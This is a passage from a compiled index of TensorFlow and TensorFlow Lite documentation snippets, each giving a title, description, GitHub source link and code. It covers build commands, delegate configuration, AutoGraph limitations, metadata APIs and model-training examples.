  files_list = glob.glob(files)
  random_audio_path = random.choice(files_list)
  return random_audio_path

def show_sample(audio_path):
  audio_data, sample_rate = sf.read(audio_path)
  class_name = os.path.basename(os.path.dirname(audio_path))
  print(f'Class: {class_name}')
  print(f'File: {audio_path}')
  print(f'Sample rate: {sample_rate}')
  print(f'Sample length: {len(audio_data)}')

  plt.title(class_name)
  plt.plot(audio_data)
  display(Audio(audio_data, rate=sample_rate))
```

LANGUAGE: python
CODE:
```
random_audio = get_random_audio_file(test_dir)
show_sample(random_audio)
```

----------------------------------------

TITLE: Configuring XNNPACK Delegate Options in C
DESCRIPTION: This snippet demonstrates how to enable the transient indirection buffer feature for the TensorFlow Lite XNNPACK delegate in C. It retrieves the default delegate options, sets the TFLITE_XNNPACK_DELEGATE_FLAG_TRANSIENT_INDIRECTION_BUFFER flag in the options' flags bitmask, and then uses the modified options to create the XNNPACK delegate instance. This reduces memory usage at the cost of re-initializing indirection buffers per inference run.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/xnnpack/README.md#_snippet_10

LANGUAGE: C
CODE:
```
TfLiteXNNPackDelegateOptions xnnpack_options =\n    TfLiteXNNPackDelegateOptionsDefault();\n...\nxnnpack_options.flags |= TFLITE_XNNPACK_DELEGATE_FLAG_TRANSIENT_INDIRECTION_BUFFER;\nTfLiteDelegate* xnnpack_delegate =\n    TfLiteXNNPackDelegateCreate(&xnnpack_options);
```

----------------------------------------

TITLE: Modifying Python List in tf.while_loop Body Python
DESCRIPTION: Attempts to append to a standard Python list (`l`) inside the body of a `tf.while_loop`. While this works in eager execution, it is not supported in TensorFlow graph execution (used by `tf.function` or AutoGraph) because modifying mutable Python objects within graph control flow is illegal.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_23

LANGUAGE: Python
CODE:
```
def fn():
  l = []

  def loop_cond(i):
    return i < 10

  def loop_body(i):
    i = i + 1
    l.append(i)
    return i,

  tf.while_loop(
      cond=loop_cond,
      body=loop_body,
      loop_vars=(0,))

  return l
```

----------------------------------------

TITLE: Creating SentencePiece Metadata - Python
DESCRIPTION: Creates and returns a Flatbuffers Python object representing the SentencePiece tokenizer metadata based on the initialized information.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/SentencePieceTokenizerMd.md#_snippet_1

LANGUAGE: python
CODE:
```
create_metadata() -> tflite_support.metadata_schema_py_generated.ProcessUnitT
```

----------------------------------------

TITLE: Defining and Using Custom Keras Layer with TF NumPy
DESCRIPTION: Defines a custom Keras Layer (`ProjectionLayer`) that uses TensorFlow NumPy methods (`tnp.sqrt`, `tnp.random.randn`, `tnp.matmul`) for its operations and interacts with `tf.Variable`. The layer is demonstrated by calling it with both TF NumPy ND Array and standard `tf.Tensor` inputs, showing its flexibility.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Keras_and_Distribution_Strategy.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
class ProjectionLayer(tf.keras.layers.Layer):
  """Linear projection layer using TF NumPy."""

  def __init__(self, units):
    super(ProjectionLayer, self).__init__()
    self._units = units

  def build(self, input_shape):
    stddev = tnp.sqrt(self._units).astype(tnp.float32)
    initial_value = tnp.random.randn(input_shape[1], self._units).astype(
        tnp.float32) / stddev
    # Note that TF NumPy can interoperate with tf.Variable.
    self.w = tf.Variable(initial_value, trainable=True)

  def call(self, inputs):
    return tnp.matmul(inputs, self.w)

# Call with ndarray inputs
layer = ProjectionLayer(2)
tnp_inputs = tnp.random.randn(2, 4).astype(tnp.float32)
print("output:", layer(tnp_inputs))

# Call with tf.Tensor inputs
tf_inputs = tf.random.uniform([2, 4])
print("\noutput: ", layer(tf_inputs))
```

----------------------------------------

TITLE: Getting TFLite Converter with Quantization Settings Python
DESCRIPTION: Configures a provided TensorFlow Lite converter object with the post-training quantization settings defined by this configuration object. It applies the specific optimization, calibration, and type settings to the converter, preparing it for model conversion with quantization enabled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/config/QuantizationConfig.md#_snippet_4

LANGUAGE: python
CODE:
```
get_converter_with_quantization(
    converter, **kwargs
)
```

----------------------------------------

TITLE: Configure Android Studio Build System None
DESCRIPTION: This code snippet shows how to configure the `build.gradle` file in the Android Studio project to use the TensorFlow AAR from JCenter instead of building the native code from source. Setting `nativeBuildSystem` to 'none' disables Bazel integration for native code compilation. This simplifies the build process but may disable certain features.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/android/test/README.md#_snippet_0

LANGUAGE: None
CODE:
```
def nativeBuildSystem = 'none'
```

----------------------------------------

TITLE: Downloading and Extracting Default Yoga Dataset (Python/Shell)
DESCRIPTION: Downloads and extracts the default CG-generated yoga pose dataset if neither skipping preprocessing (`is_skip_step_1` is False) nor using a custom dataset (`use_custom_dataset` is False). It uses `wget` to download the zip file and `unzip` to extract it, then sets `IMAGES_ROOT` to the dataset directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_8

LANGUAGE: Python
CODE:
```
if not is_skip_step_1 and not use_custom_dataset:
  !wget -O yoga_poses.zip http://download.tensorflow.org/data/pose_classification/yoga_poses.zip
  !unzip -q yoga_poses.zip -d yoga_cg
  IMAGES_ROOT = "yoga_cg"
```

----------------------------------------

TITLE: Downloading AArch64 Toolchain (sh)
DESCRIPTION: These commands download the specified ARM GNU toolchain for AArch64 from Google Storage, create a target directory under the user's home folder, and extract the toolchain archives into that directory, preparing it for cross-compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake_arm.md#_snippet_2

LANGUAGE: sh
CODE:
```
curl -LO https://storage.googleapis.com/mirror.tensorflow.org/developer.arm.com/media/Files/downloads/gnu-a/8.3-2019.03/binrel/gcc-arm-8.3-2019.03-x86_64-aarch64-linux-gnu.tar.xz
mkdir -p ${HOME}/toolchains
tar xvf gcc-arm-8.3-2019.03-x86_64-aarch64-linux-gnu.tar.xz -C ${HOME}/toolchains
```

----------------------------------------

TITLE: Converting a Frozen GraphDef (.pb) to TFLite
DESCRIPTION: This command converts a TensorFlow Frozen GraphDef file to TFLite. Unlike SavedModels or Keras models, Frozen GraphDefs require explicitly specifying the input and output tensor names using `--input_arrays` and `--output_arrays` respectively.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_3

LANGUAGE: Shell
CODE:
```
tflite_convert \
  --graph_def_file=/tmp/mobilenet_v1_0.50_128/frozen_graph.pb \
  --output_file=/tmp/foo.tflite \
  --input_arrays=input \
  --output_arrays=MobilenetV1/Predictions/Reshape_1
```

----------------------------------------

TITLE: Building Native TensorFlow Inference Library with Bazel (Bash)
DESCRIPTION: This Bazel command builds the native libtensorflow_inference.so library for Android inference. It specifies optimization flags, the crosstool for Android, C++ standard, and the target CPU architecture (e.g., armeabi-v7a). The resulting library is placed in the bazel-bin directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/android/inference_interface/README.md#_snippet_1

LANGUAGE: Bash
CODE:
```
bazel build -c opt //tensorflow/tools/android/inference_interface:libtensorflow_inference.so \
   --crosstool_top=//external:android/crosstool \
   --host_crosstool_top=@bazel_tools//tools/cpp:toolchain \
   --cxxopt=-std=c++11 \
   --cpu=armeabi-v7a
```

----------------------------------------

TITLE: Conditional Variable Definition (One Branch) - Incorrect
DESCRIPTION: AutoGraph forbids variables used after a conditional statement (with a `tf.Tensor` condition) from being defined in only one branch. This snippet demonstrates an error where 'x' is only defined in the 'if' branch but used afterwards.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_2

LANGUAGE: python
CODE:
```
del x
if tf.random.uniform(()) > 0.5:
  x = tf.constant(1)
else:
  pass
tf.print(x)  # Error -- x may be undefined here
```

----------------------------------------

TITLE: Build TFLite Pip with Bazel - Optimized Native (Shell)
DESCRIPTION: Runs the `build_pip_package_with_bazel.sh` script with the `native` argument. This instructs Bazel to perform an optimized build specifically for the host machine's architecture, potentially yielding better performance but possibly affecting portability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_7

LANGUAGE: sh
CODE:
```
tensorflow/lite/tools/pip_package/build_pip_package_with_bazel.sh native
```

----------------------------------------

TITLE: Get Keras Serving Model (Python)
DESCRIPTION: Returns the TensorFlow Keras model instance underlying the classification task. This model can be used for serving predictions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/AudioClassifier.md#_snippet_4

LANGUAGE: Python
CODE:
```
create_serving_model()
```

----------------------------------------

TITLE: Adding Description to TFLite Model Metadata in Python
DESCRIPTION: This snippet shows the function signature for `ModelMetadataAddDescription`, used to attach a text description to a TFLite model's metadata. It requires a FlatBuffers `builder` instance and the `description` string. This function is part of the generated metadata schema utilities.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataAddDescription.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataAddDescription(
    builder, description
)
```

----------------------------------------

TITLE: Selecting EfficientDet Model Spec Python
DESCRIPTION: Selects the model specification for the EfficientDet-Lite0 architecture using the `model_spec.get` function. This specification contains configuration details like number of classes and input size needed for model creation and training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
spec = model_spec.get('efficientdet_lite0')
```

----------------------------------------

TITLE: Performing Embedding TFLite AudioEmbedder Python
DESCRIPTION: Performs the core task of feature vector extraction on the provided `TensorAudio` input. Takes a `TensorAudio` object and returns an `EmbeddingResult` containing the computed feature vectors. Raises `ValueError` or `RuntimeError` on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioEmbedder.md#_snippet_6

LANGUAGE: python
CODE:
```
embed(
    audio: tflite_support.task.audio.TensorAudio
) -> tflite_support.task.processor.EmbeddingResult
```

----------------------------------------

TITLE: Downloading and Configuring pthreadpool (if XNNPACK enabled)
DESCRIPTION: Conditionally downloads the pthreadpool library if `TFLITE_ENABLE_XNNPACK` is ON and `SYSTEM_PTHREADPOOL` is OFF, or `PTHREADPOOL_SOURCE_DIR` is not defined. It configures the library with tests and benchmarks disabled and adds it as a target dependency if not using a system version.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_15

LANGUAGE: CMake
CODE:
```
if(TFLITE_ENABLE_XNNPACK)
  # pthreadpool is used by XNNPACK.
  if(SYSTEM_PTHREADPOOL)
    find_library(PTHREADPOOL_LIB pthreadpool REQUIRED)
  elseif(NOT DEFINED PTHREADPOOL_SOURCE_DIR)
      message(STATUS "Downloading pthreadpool to ${CMAKE_BINARY_DIR}/pthreadpool-source (define SYSTEM_PTHREADPOOL or PTHREADPOOL_SOURCE_DIR to avoid it)")
      configure_file(cmake/DownloadPThreadPool.cmake "${CMAKE_BINARY_DIR}/pthreadpool-download/CMakeLists.txt")
      execute_process(COMMAND "${CMAKE_COMMAND}" -G "${CMAKE_GENERATOR}" .
        WORKING_DIRECTORY "${CMAKE_BINARY_DIR}/pthreadpool-download")
      execute_process(COMMAND "${CMAKE_COMMAND}" --build .
        WORKING_DIRECTORY "${CMAKE_BINARY_DIR}/pthreadpool-download")
      set(PTHREADPOOL_SOURCE_DIR "${CMAKE_BINARY_DIR}/pthreadpool-source" CACHE STRING "pthreadpool source directory")
  endif()
  # Configure pthreadpool
  if(NOT SYSTEM_PTHREADPOOL AND NOT TARGET pthreadpool)
    set(PTHREADPOOL_BUILD_TESTS OFF CACHE BOOL "")
    set(PTHREADPOOL_BUILD_BENCHMARKS OFF CACHE BOOL "")
    set(PTHREADPOOL_ALLOW_DEPRECATED_API OFF CACHE BOOL "")
    add_subdirectory(
      "${PTHREADPOOL_SOURCE_DIR}"
      "${CMAKE_BINARY_DIR}/pthreadpool")
  endif()
  list(APPEND TFLITE_TARGET_DEPENDENCIES pthreadpool)

  IF(NOT DEFINED FP16_SOURCE_DIR)
    MESSAGE(STATUS "Downloading FP16 to ${CMAKE_BINARY_DIR}/FP16-source (define FP16_SOURCE_DIR to avoid it)")
    CONFIGURE_FILE(cmake/DownloadFP16.cmake "${CMAKE_BINARY_DIR}/FP16-download/CMakeLists.txt")
    EXECUTE_PROCESS(COMMAND "${CMAKE_COMMAND}" -G "${CMAKE_GENERATOR}" .
      WORKING_DIRECTORY "${CMAKE_BINARY_DIR}/FP16-download")
    EXECUTE_PROCESS(COMMAND "${CMAKE_COMMAND}" --build .
      WORKING_DIRECTORY "${CMAKE_BINARY_DIR}/FP16-download")
    SET(FP16_SOURCE_DIR "${CMAKE_BINARY_DIR}/FP16-source" CACHE STRING "FP16 source directory")
  ENDIF()
endif()
```

----------------------------------------

TITLE: Lower BatchToSpaceND - Pseudo-code (MLIR/C++)
DESCRIPTION: Provides pseudo-code steps to lower the TensorFlow BatchToSpaceND operation into a sequence of TOSA primitive operations: RESHAPE, TRANSPOSE, and SLICE. It calculates intermediate shapes and permutations based on the input shape, block shape, and crops, then applies the TOSA operations sequentially.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_4

LANGUAGE: Pseudo-code (MLIR/C++)
CODE:
```
Value lower_batch_to_space_nd_op(Value %input, Value %block_shape, Value %crops, shape_t output_shape)
{

    vector <size_t> block_shape(%block_shape.rank);
    vector std::pair<size_t, size_t> crops_arr;

    size_t remaining_shape_rank = %input.rank - %block.rank - 1;
    size_t crops_dim = %crops.shape[0];

    for (int32 i = 0; i < crops_dim; i++) {
        crops[i] = std::make_pair(%crops.as_constant()[i * crops_dim + 0],
                                  %crops.as_constant()[i * crops_dim + 1]);
    }

    // Step 1: Reshape input to
    // [block_shape[0],
    // ...
    // [block_shape[M-1],
    // [batch / prod(block_shape)]
    // [input_shape[1],
    // ...
    // [input_shape[N-1]

    vector <size_t> a1_shape(%block.rank + %input.rank);

    for (int32 i = 0; i < %block.rank; i++) {
        a1_shape[i] = %block.shape[i];
    }

    a1_shape[%block.rank] = %input.shape.[0] / %block.num_elements;

    for (int32 i = 1; i < %input.rank; i++) {
        a1_shape[i + %block.rank] = %input.shape[i];
    }

    // Step 2. Permute to shape:
    // [ batch / prod(block_shape) ],
    // [ input_shape[1] ], [ block_shape[0] ]
    //  ...
    // [ input_shape[M] ], [ block_shape[M-1]
    // + remaining_input_shapes input_shape[M+1 .. N-1]
    vector <size_t> a2_perm(%block.rank + %input.rank);

    a2_perm[0] = %block.rank;
    for (int32 i = 0; i < %block.rank; i++) {
        a2_perm[1 + i * 2 + 0] = %block.rank + 1 + i;
        a2_perm[1 + i * 2 + 1] = i;
    }

    // Step 3. Reshape to
    // [ batch / prod(block_shape) ],
    // [input_shape[1] * block_shape[0] ],
    //    ..
    // [input_shape[M * block_shape[M-1],
    // + remaining input shapes [input_shape[M+1.. N-1]]
    vector <size_t> a3_shape(%input.rank);

    %a3_shape[0] = %input.shape[0] / %block.num_elements;
    for (int32 i = 0; i < %block.rank; i++) {
        a3_shape[i + 1] = %input.shape[i + 1] * %block.shape[i];
    }

    for (int32 i = 0; remaining_block_shape; i++) {
        a3_shape[1 + %block.rank + 1] = %input.shape[%block.rank + 1 + i];
    }

    // Step 4 Crop the start/end dimensions using slice
    vector <size_t> a4_begin(%input.rank), a4_size(%input.rank);

    for (int32 i = 0; i < %input.rank; i++) {
        if (i == 0 || i > crop_dims) {
           a4_begin[i] = 0;
           a4_size[i] = output_shape[i];
        } else {
          a4_begin[i] = %crops[i-1].first;
          a4_size[i] = crops[i - 1].first - crops[i - 1].second;
        }
    }

    %a1_reshape = tosa.RESHAPE(%input) {new_shape=a1_shape};
    %a2_transpose = tosa.TRANSPOSE(%a1_reshape) {perms=a2_perm};
    %a3_reshape = tosa.RESHAPE(%a2_transpose) {new_shape=a3_shape};
    %output = tosa.SLICE(%a3_reshape) {begin=a4_begin, size=a4_size};

    return %output;
}
```

----------------------------------------

TITLE: Evaluating Trained Model - TensorFlow Lite Model Maker - Python
DESCRIPTION: Evaluates the accuracy and loss of the newly trained or retrained model using a provided test dataset. This assesses the model's performance after training with potentially customized parameters or architecture.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_28

LANGUAGE: python
CODE:
```
loss, accuracy = model.evaluate(new_test_data)
```

----------------------------------------

TITLE: Installing TFLite Model Maker (bash)
DESCRIPTION: Provides the command-line instruction to install the TFLite Model Maker Python package using pip. Requires pip to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker.md#_snippet_0

LANGUAGE: bash
CODE:
```
pip install tflite-model-maker
```

----------------------------------------

TITLE: Implementing ObjC Wrapper with C++ Delegation for TFLite BertQuestionAnswerer (Objective-C++)
DESCRIPTION: Provides the Objective-C++ (.mm) implementation for the TFLBertQuestionAnswerer class. It utilizes an std::unique_ptr to manage the lifecycle of the native C++ object, implements the initializer by calling the C++ CreateBertQuestionAnswerer method and asserting success, and implements the answer method by delegating the call to the C++ Answer function and converting the C++ results (std::vector) into Objective-C arrays.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/customized_task_api.md#_snippet_10

LANGUAGE: Objective-C++
CODE:
```
using BertQuestionAnswererCPP = ::tflite::task::text::BertQuestionAnswerer;

@implementation TFLBertQuestionAnswerer {
  // define an iVar for the native API object
  std::unique_ptr<QuestionAnswererCPP> _bertQuestionAnswerwer;
}

// Initialize the native API object
+ (instancetype)mobilebertQuestionAnswererWithModelPath:(NSString *)modelPath
                                          vocabPath:(NSString *)vocabPath {
  absl::StatusOr<std::unique_ptr<QuestionAnswererCPP>> cQuestionAnswerer =
      BertQuestionAnswererCPP::CreateBertQuestionAnswerer(MakeString(modelPath),
                                                          MakeString(vocabPath));
  _GTMDevAssert(cQuestionAnswerer.ok(), @"Failed to create BertQuestionAnswerer");
  return [[TFLBertQuestionAnswerer alloc]
      initWithQuestionAnswerer:std::move(cQuestionAnswerer.value())];
}

// Calls the native API and converts C++ results into ObjC results
- (NSArray<TFLQAAnswer *> *)answerWithContext:(NSString *)context question:(NSString *)question {
  std::vector<QaAnswerCPP> results =
    _bertQuestionAnswerwer->Answer(MakeString(context), MakeString(question));
  return [self arrayFromVector:results];
}
}
```

----------------------------------------

TITLE: Building TFLite Project with GPU Delegate for iOS using Bazel
DESCRIPTION: This shell command demonstrates the Bazel build configuration for compiling a project with the TFLite GPU delegate on iOS. The `--config ios_fat` flag is used to create a universal binary suitable for iOS devices, including the Metal shaders required for GPU acceleration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/gpu/README.md#_snippet_2

LANGUAGE: shell
CODE:
```
bazel build --config ios_fat //path/to/your:project
```

----------------------------------------

TITLE: Implementing Custom GRU Layer Python
DESCRIPTION: This Python class implements a GRU layer using the custom GRUCell. It handles stateful and stateless execution modes, transposing inputs, and using `tf.scan` to process the sequence timestep by timestep.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_19

LANGUAGE: python
CODE:
```
class GRU:

  def __init__(self, n_units, forget_bias=0.0, stateful=False):
    self._cell = GRUCell(n_units, forget_bias)
    self._stateful = stateful
    self._built = False

  def __call__(self, inputs):
    if not self._built:
      self.build(inputs)
    if self._stateful:
      state = self.state.read_value()
    else:
      state = self._init_state(inputs.shape[0])    
    inputs = tnp.transpose(inputs, (1, 0, 2))
    output =  tf.scan(
        lambda gru_state, x: self._cell((x, gru_state)),
        inputs, state)
    if self._stateful:
      self.state.assign(output[-1, ...])
    return tnp.transpose(output, [1, 0, 2])

  def _init_state(self, batch_size):
    return tnp.zeros([batch_size, self._cell._n_units], tnp.float32)

  def reset_state(self):
    if not self._stateful:
      return
    self.state.assign(tf.zeros_like(self.state))

  def create_state(self, batch_size):
    self.state = tf.Variable(self._init_state(batch_size))

  def build(self, inputs):
    s = inputs.shape[0:1] + inputs.shape[2:]
    shapes = (s, s[:-1] + (self._cell._n_units,))   
    self._cell.build([tf.TensorSpec(x, tf.float32) for x in shapes])
    if self._stateful:
      self.create_state(inputs.shape[0])
    else:
      self.state = ()
    self._built = True
    
  @property
  def weights(self):
    return self._cell.weights
```

----------------------------------------

TITLE: Comparing Float and Quantized Models (Python)
DESCRIPTION: Compare the overall outputs of the original float model and the quantized debug model. Provide the float model content (or path) to the `QuantizationDebugger` constructor. Define custom `model_debug_metrics` in `QuantizationDebugOptions` as functions that accept lists of output tensors from both models and return a comparison metric.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/optimize/debugging/README.md#_snippet_4

LANGUAGE: python
CODE:
```
# functions for model_debug_metrics gets all output tensors from float and
# quantized models, and returns a single metric value.
debug_options = debugger.QuantizationDebugOptions(
    model_debug_metrics={
        'argmax_accuracy': lambda f, q: np.argmax(f[0]) == np.argmax(q[0])
    })

float_model = converter.convert()  # converted without any optimizations.

quant_debugger = debugger.QuantizationDebugger(
    quant_debug_model_content=quant_debug_model,
    float_model_content=float_model,  # can pass `float_model_path` instead.
    debug_dataset=data_gen,
    debug_options=debug_options
)
quant_debugger.run()
```

----------------------------------------

TITLE: Downloading Shakespeare Dataset - Python
DESCRIPTION: This snippet downloads the Shakespeare text dataset from a public URL using TensorFlow's utility function. The dataset is saved locally to a temporary file, which will be used as the training data for the text generation model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
path_to_file = tf.keras.utils.get_file('shakespeare.txt', 'https://storage.googleapis.com/download.tensorflow.org/data/shakespeare.txt')
```

----------------------------------------

TITLE: Use Local TensorFlowLiteSwift Pod (Podfile)
DESCRIPTION: Modifies an iOS project's Podfile to reference the `TensorFlowLiteSwift` pod from a local path instead of a remote CocoaPods repository, enabling development with local changes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_7

LANGUAGE: Ruby
CODE:
```
pod 'TensorFlowLiteSwift', :path => '<your_tensorflow_root_dir>'
```

----------------------------------------

TITLE: Running TFLite Evaluation on Android via ADB Shell
DESCRIPTION: This comprehensive ADB shell command executes the `run_eval` binary on the Android device. It passes required parameters specifying the paths to the model file, ground truth images, ground truth labels, model output labels, and the desired output file path. `--num_images=0` indicates evaluation on all images.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification/README.md#_snippet_8

LANGUAGE: Shell
CODE:
```
adb shell /data/local/tmp/run_eval \
  --model_file=/data/local/tmp/mobilenet_quant_v1_224.tflite \
  --ground_truth_images_path=/data/local/tmp/ilsvrc_images \
  --ground_truth_labels=/data/local/tmp/ilsvrc_validation_labels.txt \
  --model_output_labels=/data/local/tmp/model_output_labels.txt \
  --output_file_path=/data/local/tmp/accuracy_output.txt \
  --num_images=0 # Run on all images.
```

----------------------------------------

TITLE: Visualizing Super Resolution Results (Python)
DESCRIPTION: Takes the original low-resolution input (after converting back to uint8) and the ESRGAN super-resolution output, displaying both using Matplotlib. It also generates and displays a bicubic upsampled version of the low-resolution image for visual comparison against the ESRGAN output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/super_resolution/overview.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
lr = tf.cast(tf.squeeze(lr, axis=0), tf.uint8)
plt.figure(figsize = (1, 1))
plt.title('LR')
plt.imshow(lr.numpy());

plt.figure(figsize=(10, 4))
plt.subplot(1, 2, 1)        
plt.title(f'ESRGAN (x4)')
plt.imshow(sr.numpy());

bicubic = tf.image.resize(lr, [200, 200], tf.image.ResizeMethod.BICUBIC)
bicubic = tf.cast(bicubic, tf.uint8)
plt.subplot(1, 2, 2)   
plt.title('Bicubic')
plt.imshow(bicubic.numpy());
```

----------------------------------------

TITLE: Creating Input Text Metadata Python Method
DESCRIPTION: This method is part of the `InputTextTensorMd` class and is used to generate the Flatbuffers Python object representing the input text metadata. It constructs the metadata based on the information provided during the class instantiation. It returns a `TensorMetadataT` object and raises a `ValueError` if an unsupported tokenizer type is provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/InputTextTensorMd.md#_snippet_1

LANGUAGE: python
CODE:
```
create_metadata() -> tflite_support.metadata_schema_py_generated.TensorMetadataT
```

----------------------------------------

TITLE: Installing TensorFlow Nightly Build via Pip
DESCRIPTION: Installs the required `tf-nightly` package using pip. This provides access to the latest TensorFlow features, including `tensorflow.experimental.numpy`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Keras_and_Distribution_Strategy.ipynb#_snippet_0

LANGUAGE: shell
CODE:
```
!pip install --quiet --upgrade tf-nightly
```

----------------------------------------

TITLE: Creating BertInput Tensor Metadata Python
DESCRIPTION: Creates and returns a list containing `TensorMetadataT` objects for the three standard BERT input tensors: ids, mask, and segment IDs. It utilizes the `ids_md`, `mask_md`, and `segment_ids_md` information provided or defaulted when the `BertInputTensorsMd` instance was created.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/BertInputTensorsMd.md#_snippet_2

LANGUAGE: Python
CODE:
```
create_input_tesnor_metadata() -&gt; List[&lt;a href=&quot;../../../tflite_support/metadata_schema_py_generated/TensorMetadataT&quot;&gt;&lt;code&gt;tflite_support.metadata_schema_py_generated.TensorMetadataT&lt;/code&gt;&lt;/a&gt;]
```

----------------------------------------

TITLE: Initializing EmbeddingResult Python
DESCRIPTION: Initializes an `EmbeddingResult` object with a list of embeddings. The `embeddings` attribute holds the feature vectors produced by the model's output layers. For most models, this list contains a single `Embedding`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/EmbeddingResult.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.EmbeddingResult(
    embeddings: List[tflite_support.task.processor.Embedding]
)
```

----------------------------------------

TITLE: Build TensorFlow Lite Demo for Android ARMv8
DESCRIPTION: Builds the TensorFlow Lite C++ label_image example for Android devices with ARMv8 architecture using Bazel. Requires configuring the Android NDK in the WORKSPACE file or via environment variables. The '--config=android_arm64' flag targets 64-bit ARM.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_2

LANGUAGE: shell
CODE:
```
bazel build -c opt --config=android_arm64 \
  //tensorflow/lite/examples/label_image:label_image
```

----------------------------------------

TITLE: Initializing NearestNeighbor Object - Python
DESCRIPTION: This code snippet shows the constructor signature for the `NearestNeighbor` class. It requires user-defined `metadata` as a bytearray and the `distance` score as a float to create an instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/NearestNeighbor.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.processor.NearestNeighbor(
    metadata: bytearray, distance: float
)
```

----------------------------------------

TITLE: Disabling Quantization for GpuDelegate (C)
DESCRIPTION: Shows the C code required to explicitly disable support for quantized models by retrieving the default `TFLGpuDelegateOptions`, setting `enable_quantization` to `false`, and creating the delegate with the modified options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/ios/delegates/gpu.md#_snippet_11

LANGUAGE: C
CODE:
```
    TFLGpuDelegateOptions options = TFLGpuDelegateOptionsDefault();
    options.enable_quantization = false;

    TfLiteDelegate* delegate = TFLGpuDelegateCreate(options);
```

----------------------------------------

TITLE: Making Evaluation Binary Executable on Android Shell
DESCRIPTION: This ADB shell command changes the permissions of the `run_eval` binary on the Android device (`/data/local/tmp/run_eval`) to make it executable. This is a necessary step before attempting to run the binary on the device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification/README.md#_snippet_3

LANGUAGE: Shell
CODE:
```
adb shell chmod +x /data/local/tmp/run_eval
```

----------------------------------------

TITLE: Importing TensorFlow and Configuring Devices
DESCRIPTION: Imports TensorFlow and TensorFlow experimental NumPy. It then configures three logical GPU devices on the first physical GPU, which is necessary for demonstrating the distribution strategy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Keras_and_Distribution_Strategy.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
import tensorflow.experimental.numpy as tnp

# Creates 3 logical GPU devices for demonstrating distribution.
gpu_device = tf.config.list_physical_devices("GPU")[0]
tf.config.set_logical_device_configuration(
    gpu_device, [tf.config.LogicalDeviceConfiguration(128)] * 3)
```

----------------------------------------

